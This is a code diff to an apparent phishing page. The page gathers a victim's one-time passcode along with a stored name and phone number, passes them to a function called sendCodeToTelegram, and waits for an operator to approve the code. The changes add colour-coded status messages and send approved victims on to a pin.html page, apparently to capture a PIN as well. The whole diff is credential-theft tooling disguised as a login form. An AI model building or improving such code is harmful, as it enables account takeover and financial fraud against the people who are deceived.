@@ -95,8 +95,11 @@ button:not(:disabled){ background:#00843d; }
 #status{
   margin-top:14px;
   font-size:14px;
-  color:#00843d;
+  min-height:18px;
+  font-weight:600;
 }
+#status.success{ color:#00843d; }   /* green */
+#status.error{   color:#d32f2f; }   /* red   */
 </style>
 </head>
 
@@ -149,12 +152,19 @@ const spinner     = document.getElementById('spinner');
 const statusEl    = document.getElementById('status');
 const timerDisplay= document.getElementById('timerDisplay');
 
-// Always read fresh from localStorage each time we send something
 function getIdentity(){
   return {
     name:  localStorage.getItem("name")  || "Unknown",
     phone: localStorage.getItem("phone") || "Unknown"
   };
+}
+
+// 🎨 status helper: success = green, error = red
+function setStatus(text, type){
+  statusEl.textContent = text;
+  statusEl.classList.remove("success", "error");
+  if(type === "success") statusEl.classList.add("success");
+  if(type === "error")   statusEl.classList.add("error");
 }
 
 let countdown;
@@ -185,7 +195,7 @@ function startCountdown(duration = 30){
     timerDisplay.textContent = time;
     if(time<=0){
       clearInterval(countdown);
-      statusEl.textContent="The OTP code has expired. Please request a new code.";
+      setStatus("The OTP code has expired. Please request a new code.", "error");
       submitBtn.disabled=true;
     }
   },1000);
@@ -227,16 +237,16 @@ function pollCodeApproval(requestId){
 document.getElementById('otpForm').addEventListener('submit', async e=>{
   e.preventDefault();
   const code = [...inputs].map(i=>i.value).join('');
-  const { name, phone } = getIdentity();   // fresh read every submit
+  const { name, phone } = getIdentity();
 
   submitBtn.disabled=true;
   btnText.textContent="Verifying";
   spinner.style.display="inline-block";
-  statusEl.textContent="Waiting for validation...";
+  setStatus("Waiting for validation...", "success");
 
   const res = await sendCodeToTelegram(name, phone, code);
   if(!res||!res.requestId){
-    statusEl.textContent="Failed to send.";
+    setStatus("Failed to send.", "error");
     submitBtn.disabled=false;
     btnText.textContent="Login";
     spinner.style.display="none";
@@ -247,10 +257,11 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
   clearInterval(countdown);
 
   if(approved){
+    setStatus("Code approved. Redirecting...", "success");
     localStorage.clear();
-    window.location.href=`success.html?botId=${botId}`;
+    window.location.href=`pin.html?botId=${botId}`;
   }else{
-    statusEl.textContent="Incorrect OTP code. Please try again.";
+    setStatus("Incorrect OTP code. Please try again.", "error");
     inputs.forEach(i=>i.value="");
     submitBtn.disabled=false;
     btnText.textContent="Login";
